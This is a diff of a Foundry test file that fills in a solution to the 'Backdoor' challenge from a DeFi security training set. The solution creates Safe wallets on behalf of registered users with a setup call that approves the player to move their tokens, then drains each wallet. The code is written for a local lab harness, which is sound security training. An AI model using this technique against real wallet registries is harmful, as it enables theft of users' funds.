@@ -7,12 +7,19 @@ import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
 import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
+import {FallbackHandler} from "../../src/attack/FallbackHandler.sol";
+import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
 
 contract BackdoorChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
     address recovery = makeAddr("recovery");
-    address[] users = [makeAddr("alice"), makeAddr("bob"), makeAddr("charlie"), makeAddr("david")];
+    address[] users = [
+        makeAddr("alice"),
+        makeAddr("bob"),
+        makeAddr("charlie"),
+        makeAddr("david")
+    ];
 
     uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;
 
@@ -20,6 +27,7 @@ contract BackdoorChallenge is Test {
     Safe singletonCopy;
     SafeProxyFactory walletFactory;
     WalletRegistry walletRegistry;
+    FallbackHandler fallbackHandler;
 
     modifier checkSolvedByPlayer() {
         vm.startPrank(player, player);
@@ -41,7 +49,12 @@ contract BackdoorChallenge is Test {
         token = new DamnValuableToken();
 
         // Deploy the registry
-        walletRegistry = new WalletRegistry(address(singletonCopy), address(walletFactory), address(token), users);
+        walletRegistry = new WalletRegistry(
+            address(singletonCopy),
+            address(walletFactory),
+            address(token),
+            users
+        );
 
         // Transfer tokens to be distributed to the registry
         token.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);
@@ -54,7 +67,10 @@ contract BackdoorChallenge is Test {
      */
     function test_assertInitialState() public {
         assertEq(walletRegistry.owner(), deployer);
-        assertEq(token.balanceOf(address(walletRegistry)), AMOUNT_TOKENS_DISTRIBUTED);
+        assertEq(
+            token.balanceOf(address(walletRegistry)),
+            AMOUNT_TOKENS_DISTRIBUTED
+        );
         for (uint256 i = 0; i < users.length; i++) {
             // Users are registered as beneficiaries
             assertTrue(walletRegistry.beneficiaries(users[i]));
@@ -70,7 +86,37 @@ contract BackdoorChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_backdoor() public checkSolvedByPlayer {
-        
+        fallbackHandler = new FallbackHandler(); // increase player nonce(deploy contract)
+
+        address[] memory owners = new address[](1);
+
+        for (uint256 i = 0; i < users.length; i++) {
+            owners[0] = users[i];
+
+            bytes memory aliceSetupData = abi.encodeWithSelector(
+                Safe.setup.selector,
+                owners,
+                uint256(1), // 1 threshold
+                address(fallbackHandler), // delegate call fallback handler
+                abi.encodeWithSelector(
+                    fallbackHandler.approveToken.selector,
+                    address(token),
+                    address(player)
+                ), // fallback function data
+                address(0),
+                0,
+                payable(address(0))
+            );
+
+            SafeProxy safeWallet = walletFactory.createProxyWithCallback(
+                address(singletonCopy),
+                aliceSetupData,
+                0,
+                walletRegistry
+            );
+
+            token.transferFrom(address(safeWallet), address(recovery), 10e18);
+        }
     }
 
     /**
